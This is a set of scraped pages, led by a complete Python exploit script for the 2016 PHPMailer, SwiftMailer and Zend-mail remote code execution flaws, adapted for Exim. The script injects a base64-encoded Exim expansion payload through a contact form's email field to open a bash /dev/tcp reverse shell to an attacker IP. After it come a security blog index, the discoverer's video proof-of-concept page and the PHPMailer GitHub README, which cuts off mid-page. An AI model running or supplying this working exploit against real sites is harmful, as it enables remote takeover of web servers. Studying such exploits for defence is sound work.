# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool\_directory and tod\_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce\_phpmailer\_exim4.py -url http://victim/phpmailer/ -cf contact\_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
#
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum\_PHPMailer\_PoC\_contactform.zip
import argparse
import urllib
import urllib2
import base64
# Prepare command for Exim expansion mode in order
def prepare\_cmd(cmd):
return '${run{${base64d:%s}}}' % base64.b64encode(cmd)
# Send Request method
def send\_request(req):
try:
urllib2.urlopen(req)
except urllib2.HTTPError, e:
print "[!] Got HTTP error: [%d] when trying to reach " + req.get\_full\_url() + " - Check the URL!\n\n" % e.code
exit(3)
except urllib2.URLError, err:
print "[!] Got the '%s' error when trying to reach " + req.get\_full\_url() + " - Check the URL!\n\n" % err.reason
exit(4)
# Parse input args
parser = argparse.ArgumentParser(prog='rce\_phpmailer\_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version')
parser.add\_argument('-url', dest='WEBAPP\_BASE\_URL', help='WebApp Base Url')
parser.add\_argument('-cf', dest='CONTACT\_SCRIPT', help='Contact Form scriptname')
parser.add\_argument('-ip', dest='ATTACKER\_IP', help='Attacker IP for reverse shell')
parser.add\_argument('-p', dest='ATTACKER\_PORT', help='Attackers Port for reverse shell', default="8888")
parser.add\_argument('--display', dest='DISPLAY', help='Only display payload to be manually inserted', action="store\_true")
parser.add\_argument('--post-action', dest='POST\_ACTION', help='Overrides POST "action" field name', default="send")
parser.add\_argument('--post-name', dest='POST\_NAME', help='Overrides POST "name of sender" field name', default="name")
parser.add\_argument('--post-email', dest='POST\_EMAIL', help='Overrides POST "email" field name', default="email")
parser.add\_argument('--post-msg', dest='POST\_MSG', help='Overrides POST "message" field name', default="msg")
args = parser.parse\_args()
# Test if DISPLAY mode is activated
if not args.DISPLAY:
# Some arguments are required
if args.WEBAPP\_BASE\_URL is None:
parser.error("argument -url is required")
if args.CONTACT\_SCRIPT is None:
parser.error("argument -cf is required")
if args.ATTACKER\_IP is None:
parser.error("argument -ip is required")
# Show params
print """[+] Setting vars to: \n
WEBAPP\_BASE\_URL = [%s]
CONTACT\_SCRIPT = [%s]
ATTACKER\_IP = [%s]
ATTACKER\_PORT = [%s]
POST\_ACTION = [%s]
POST\_NAME = [%s]
POST\_EMAIL = [%s]
POST\_MSG = [%s]
""" % (args.WEBAPP\_BASE\_URL, args.CONTACT\_SCRIPT, args.ATTACKER\_IP, args.ATTACKER\_PORT, args.POST\_ACTION, args.POST\_NAME, args.POST\_EMAIL, args.POST\_MSG)
# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print "[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"
print " SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"
print " Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"
print "[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"
print "\033[0m"
try:
target = int(raw\_input('[?] Select target [1-2]: '))
except ValueError:
print "Not a valid choice. Exiting\n"
exit(2)
if (target>2):
print "No such target. Exiting\n"
exit(3)
################################
# Payload
################################
cmd = "/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'" % (args.ATTACKER\_IP, args.ATTACKER\_PORT)
# Settings the cmd for testing purpose if DISPLAY mode is activated
if args.DISPLAY:
print "[+] DISPLAY mode"
cmd = raw\_input('[?] Enter the command you want to test on the victim:\n')
if not cmd:
print "Input could not be empty. Exiting\n"
exit(2)
# preparing the payload
prepared\_cmd = prepare\_cmd(cmd)
payload = '"a\\" -be ' + prepared\_cmd + ' "@a.co'
# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
payload = "\"a\\' -be " + prepared\_cmd + " \"@a.co"
# if DISPLAY mode, we are not playing the attacking episode
if args.DISPLAY:
print "\033[1;32m[+] You should try in the sender input field the following payload:\033[0m"
print payload
exit(0)
################################
# Attack episode
# This step will execute the reverse shell
################################
CONTACT\_SCRIPT\_URL = args.WEBAPP\_BASE\_URL + args.CONTACT\_SCRIPT
# Form fields
post\_fields = {'action': "%s" % args.POST\_ACTION, "%s" % args.POST\_NAME: 'Jas Fasola', "%s" % args.POST\_EMAIL: payload, "%s" % args.POST\_MSG: 'Really important message'}
# Print relevant information
print "\n[+] Executing command on victim server\n"
print '[!] command: [%s]' % cmd
print '[!] payload: [%s]' % payload
print '[!] post\_fields: [%s]\n' % str(post\_fields)
data = urllib.urlencode(post\_fields)
req = urllib2.Request(CONTACT\_SCRIPT\_URL, data)
send\_request(req)
print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"


=== Content from phackt.com_744525a9_20250126_062515.html ===


[![logo](https://phackt.com/public/images/logo/logo_white_transparent.png "logo")](/ "Home")

[Home](https://phackt.com/)
[Categories](https://phackt.com/categories/)
[Tools](https://phackt.com/tools/)
[About](https://phackt.com/about/)

© 2024. All rights reserved.

### [phackt.com:~#](/ "Home") \_

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)
# [Should a Tier 0 WSUS be put in a silo or not ?](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)

18 Jan 2023
The question was: should I put my WSUS server into my T0 silo? Even if people are familiar with the concepts of Active Directory Tiering, ...

[Read more ...](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)
# [How to mimic Kerberos protocol transition using reflective RBCD](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)

07 Nov 2022
As I am often looking for misconfigurations dealing with Kerberos delegation, I realize that I was missing an interesting element while playing with the Kerberos protocol extensions S4U2Self and S4U2Proxy.

[Read more ...](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/dnsadmins-group-mitigation)

# [How to mitigate DnsAdmins privilege escalation ?](https://phackt.com/dnsadmins-group-mitigation)

12 May 2021

Hello,

Glad to see you in this second part of this [post](https://phackt.com/dnsadmins-group-exploitation-write-permissions). In our previous [article](https://phackt.com/dnsadmins-group-exploitation-write-permissions) we showed which rights were involved in the DnsAdmins privilege escalation. Now let’s talk about how to properly mitigate this.

[Read more ...](https://phackt.com/dnsadmins-group-mitigation)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

# [Why DnsAdmins privilege escalation is still working ?](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

22 Apr 2021

Hello,

In this article, first part of a serie, i’m talking about **DnsAdmins** and why this is a group you should take care of. I know that several articles talk about the privilege escalation (DNS service running on a domain controller and loading an arbitrary DLL).

We will quickly review this attack, but mainly i would rather focus on why it is still working nowadays, which permissions do you need to run this attack. I will conclude in a second part with the mitigations which can be implemented to prevent this attack.

[Read more ...](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

[![](https://phackt.com/public/images/icons/drapeau_fr.png)](https://phackt.com/fr-kerberos-constrained-delegation-with-protocol-transition)
# [Kerberos constrained delegation with protocol transition](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

27 Nov 2020

Hello,

Today, we are talking about the exploitation of Kerberos protocol extensions [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) in order to impersonate a privileged user of the domain.

This post aims at focusing on the [Kerberos constrained delegation with protocol transition](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587%28v%3Dws.10%29) which we will shorten `T2A4D` (**TrustedToAuthForDelegation**); how to enumerate it, how to exploit it and use it as a method of persistence.

[Read more ...](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/pentesting-bloodhound-cypher-queries)

# [More BloodHound Cypher queries](https://phackt.com/pentesting-bloodhound-cypher-queries)

04 Oct 2020

Hello,

In this blog post i will share my Cypher queries which i’m using in my daily engagements. I aim to be complementary to the [cheatsheets](https://www.google.com/search?q=bloodhound+cypher+queries+cheatsheet) you can found out there and to the default queries you will find in [BloodHound](https://github.com/BloodHoundAD/BloodHound).

[Read more ...](https://phackt.com/pentesting-bloodhound-cypher-queries)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/securitytube-redteam-labs-invoke-recon)

# [SecurityTube Advanced Red Team Lab training - Worth it ?](https://phackt.com/securitytube-redteam-labs-invoke-recon)

22 Sep 2020

Quick answer: **Totally** !

Hello everybody,

I would like to talk a bit about the [SecurityTube red team labs](https://www.pentesteracademy.com/redlabs), specifically the [Advanced Red Team Lab](https://www.pentesteracademy.com/redteamlab) which leads to the **CRTE** (Certified Red Team Expert) certification. *P.S: i’m not affiliated with securitytube*.

Some great [reviews](https://www.google.com/search?q=review+red+team+lab+pentester+academy+%22CRTE%22) are already existing, so i will focus on why i chose this lab and certification. I will give you some hints about how to approach your targets. Most importantly, i would like to introduce you a tool that i developped which will help you during your journey, [Invoke-Recon](https://github.com/phackt/Invoke-Recon).

[Read more ...](https://phackt.com/securitytube-redteam-labs-invoke-recon)

---

[Older](https://phackt.com/page2)
Newer



=== Content from legalhackers.com_8a052cb7_20250126_062451.html ===


## PHPMailer/SwiftMailer/ZendFramework Video PoC Exploit

## [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)[PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)[SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](http://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)[Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)](https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)Discovered by **Dawid Golunski** [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) <https://legalhackers.com> **Description:** The video below demonstrates how an attacker could potentially compromise a website (achieve remote code execution) by exploiting one of the vulnerabilities linked above in a web application (Contact Form) implemented with the use of: PHPMailer, Zend Framework (zend-mail) and SwiftMailer. The video focuses on PHPMailer however the attack flow is common for each of the affected frameworks/libraries. Exploit shown in the video can be downloaded from: [PHPMailer/SwiftMailer/Zend-mail exploit](https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py) To receive updates on this as well as new vulnerabilities: [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) ~~~~~~~~~~~ **ExploitBox.io** ~~~~~~~~~~~~~~~~ **Interested in security / vulns / exploits ?** Check out the new project of the author of this advisory: [**ExploitBox.io**A Playground & Labs for security folks into HACKING &AMp the art of exploitation](https://ExploitBox.io) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 **[<-- BACK TO legalhackers.com](https://legalhackers.com)**



=== Content from github.com_9b75dead_20250126_062423.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

The classic email sending library for PHP

### License

[LGPL-2.1 license](/PHPMailer/PHPMailer/blob/master/LICENSE)

[21.2k
stars](/PHPMailer/PHPMailer/stargazers) [9.7k
forks](/PHPMailer/PHPMailer/forks) [Branches](/PHPMailer/PHPMailer/branches) [Tags](/PHPMailer/PHPMailer/tags) [Activity](/PHPMailer/PHPMailer/activity)
 [Star](/login?return_to=%2FPHPMailer%2FPHPMailer)

 [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

# PHPMailer/PHPMailer

    master[Branches](/PHPMailer/PHPMailer/branches)[Tags](/PHPMailer/PHPMailer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,454 Commits](/PHPMailer/PHPMailer/commits/master/) | | |
| [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") | | [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") |  |  |
| [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") | | [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") |  |  |
| [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") | | [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") |  |  |
| [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") | | [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") |  |  |
| [language](/PHPMailer/PHPMailer/tree/master/language "language") | | [language](/PHPMailer/PHPMailer/tree/master/language "language") |  |  |
| [src](/PHPMailer/PHPMailer/tree/master/src "src") | | [src](/PHPMailer/PHPMailer/tree/master/src "src") |  |  |
| [test](/PHPMailer/PHPMailer/tree/master/test "test") | | [test](/PHPMailer/PHPMailer/tree/master/test "test") |  |  |
| [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") | | [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") |  |  |
| [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") | | [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") |  |  |
| [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") | | [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") |  |  |
| [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") | | [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") | | [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") |  |  |
| [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") | | [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") |  |  |
| [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") | | [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") |  |  |
| [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") | | [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") |  |  |
| [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") | | [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") |  |  |
| [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") | | [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") |  |  |
| [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") | | [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") |  |  |
| [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") | | [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") |  |  |
| [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") | | [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") |  |  |
| [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") | | [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") |  |  |
| View all files | | |

## Repository files navigation

* README
* LGPL-2.1 license
* Security

[![SWUbanner](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://supportukrainenow.org/)

[![PHPMailer](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)

# PHPMailer – A full-featured email creation and transfer class for PHP

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)
[![codecov.io](https://camo.githubusercontent.com/e8d290abf582d18a91f9275e33b7b4e878742877f72440f283439389073702b5/68747470733a2f2f636f6465636f762e696f2f67682f5048504d61696c65722f5048504d61696c65722f6272616e63682f6d61737465722f67726170682f62616467652e7376673f746f6b656e3d694f525a70776d596d4d)](https://codecov.io/gh/PHPMailer/PHPMailer)
[![Latest Stable Version](https://camo.githubusercontent.com/082a4b469d55b1af070c588210496a9bd0497cb883cbca19dfeaed441e711fab/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f762f737461626c652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![Total Downloads](https://camo.githubusercontent.com/b56a00b49d58b84a7b4056742b90914f23635008ec6ed5a067ee975ff815af6c/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f646f776e6c6f616473)](https://packagist.org/packages/phpmailer/phpmailer)
[![License](https://camo.githubusercontent.com/12c0c395cd01dd2fb0aec76e0000c8eb6a0fd6f7b65f9f52b0dbd6f289e60fd3/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f6c6963656e73652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![API Docs](https://github.com/phpmailer/phpmailer/workflows/Docs/badge.svg)](https://phpmailer.github.io/PHPMailer/)
[![OpenSSF Scorecard](https://camo.githubusercontent.com/e3aec1b3bdc455e8617e3e3d97c4a3dada7b95dc97106a46b9c2ac1dfd6cdd7f/68747470733a2f2f6170692e736563757269747973636f726563617264732e6465762f70726f6a656374732f6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6261646765)](https://api.securityscorecards.dev/projects/github.com/PHPMailer/PHPMailer)

## Features

* Probably the world's most popular code for sending email from PHP!
* Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more
* Integrated SMTP support – send without a local mail server
* Send emails with multiple To, CC, BCC, and Reply-to addresses
* Multipart/alternative emails for mail clients that do not read HTML email
* Add attachments, including inline
* Support for UTF-8 content and 8bit, base64, binary, and quoted-printable encodings
* SMTP authentication with LOGIN, PLAIN, CRAM-MD5, and XOAUTH2 mechanisms over SMTPS and SMTP+STARTTLS transports
* Validates email addresses automatically
* Protects against header injection attacks
* Error messages in over 50 languages!
* DKIM and S/MIME signing support
* Compatible with PHP 5.5 and later, including PHP 8.2
* Namespaced to prevent name clashes
* Much more!

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

## License

This software is distributed under the [LGPL 2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1.html) license, along with the [GPL Cooperation Commitment](https://gplcc.github.io/gplcc/). Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

